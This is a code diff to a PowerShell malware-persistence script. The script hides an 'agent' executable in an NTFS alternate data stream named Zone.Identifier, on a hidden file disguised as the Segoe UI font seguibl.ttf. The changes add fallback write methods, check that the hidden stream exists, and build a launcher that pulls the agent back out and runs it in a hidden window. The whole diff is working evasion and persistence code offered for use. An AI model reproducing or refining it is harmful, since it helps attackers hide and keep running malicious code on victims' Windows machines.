@@ -23,26 +23,52 @@ if (-not (Test-Path $fontDir)) {
 
 $fontFile = "$fontDir\seguibl.ttf"
 
-# Remove any existing font file to ensure we start clean (avoid ADS write issues)
+# Clean slate for the font file
 if (Test-Path $fontFile) {
     Remove-Item $fontFile -Force -ErrorAction SilentlyContinue
     Write-Output "[+] Removed existing font file"
 }
 
-# Create an empty file first
+# Create fresh empty file
 New-Item -ItemType File -Path $fontFile -Force | Out-Null
 attrib +h $fontFile
 Write-Output "[+] Created fresh font file: $fontFile"
 
-# --- 2. Write agent to ADS using .NET method (reliable) ---
+# --- 2. Write agent to ADS (reliable method) ---
 $streamName = "Zone.Identifier"
+$fullStreamPath = "$fontFile`:$streamName"
 $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
+
+$adsWritten = $false
 try {
-    # WriteAllBytes to the stream path: file:stream
-    [System.IO.File]::WriteAllBytes("$fontFile`:$streamName", $agentBytes)
-    Write-Output "[+] Agent embedded into ADS: $fontFile`:$streamName"
+    # Method 1: .NET WriteAllBytes (fast, works if path format is correct)
+    [System.IO.File]::WriteAllBytes($fullStreamPath, $agentBytes)
+    Write-Output "[+] Agent embedded into ADS via WriteAllBytes."
+    $adsWritten = $true
 } catch {
-    Write-Output "[-] Failed to write ADS: $_"
+    Write-Output "[-] WriteAllBytes failed: $_"
+    # Method 2: PowerShell Set-Content with -Stream (fallback, always reliable)
+    try {
+        Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte -Force
+        Write-Output "[+] Agent embedded via Set-Content fallback."
+        $adsWritten = $true
+    } catch {
+        Write-Output "[-] Fallback also failed: $_"
+    }
+}
+
+if (-not $adsWritten) {
+    Write-Output "❌ Failed to write ADS. Exiting."
+    exit
+}
+
+# Verify ADS
+$streams = Get-Item $fontFile -Stream * -ErrorAction SilentlyContinue
+if ($streams.Name -contains $streamName) {
+    $size = (Get-Item $fontFile -Stream $streamName).Length
+    Write-Output "[+] Verified: ADS '$streamName' exists (size: $size bytes)."
+} else {
+    Write-Output "[-] ADS not found after write attempts. Persistence will fail."
     exit
 }
 
@@ -58,7 +84,11 @@ $launcherContent = @"
 if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }
 
 # Extract agent from ADS
-`$bytes = [System.IO.File]::ReadAllBytes("`$fontFile`:`$streamName")
+`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
+if (-not `$bytes) {
+    # Fallback: use .NET method (more reliable)
+    try { `$bytes = [System.IO.File]::ReadAllBytes("`$fontFile`:`$streamName") } catch {}
+}
 if (`$bytes) {
     [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
     Start-Process -WindowStyle Hidden `$tempAgent
